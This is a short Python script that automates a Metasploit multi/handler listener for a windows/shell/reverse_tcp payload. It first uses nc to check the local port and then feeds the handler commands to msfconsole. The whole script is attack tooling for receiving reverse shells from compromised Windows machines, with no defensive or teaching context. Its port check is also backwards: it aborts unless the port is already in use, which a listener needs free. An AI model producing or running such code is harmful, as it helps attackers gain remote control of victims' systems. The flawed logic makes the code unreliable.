import subprocess
import sys

def check_port_with_nc(port):
    try:
        result = subprocess.run(['nc', '-zv', '127.0.0.1', str(port)], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print(f"Port {port} is open")
            return True
        else:
            print(f"Port {port} is closed")
            return False
    except subprocess.TimeoutExpired:
        print("Timeout while checking port")
        return False
    except Exception as e:
        print(f"Error while checking port: {e}")
        return False

def run_metasploit(ip, port):
    if not check_port_with_nc(port):
        print(f"Port {port} is not open. Metasploit handler setup aborted.")
        return
    
    commands = f"""
    use exploit/multi/handler
    set PAYLOAD windows/shell/reverse_tcp
    set LHOST {ip}
    set LPORT {port}
    exploit -j -z
    """
    
    process = subprocess.Popen(['msfconsole', '-q'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate(commands)
    
    print(stdout)
    if stderr:
        print(f"Errors:\n{stderr}", file=sys.stderr)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <Local IP> <Local Port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])

    run_metasploit(ip, port)
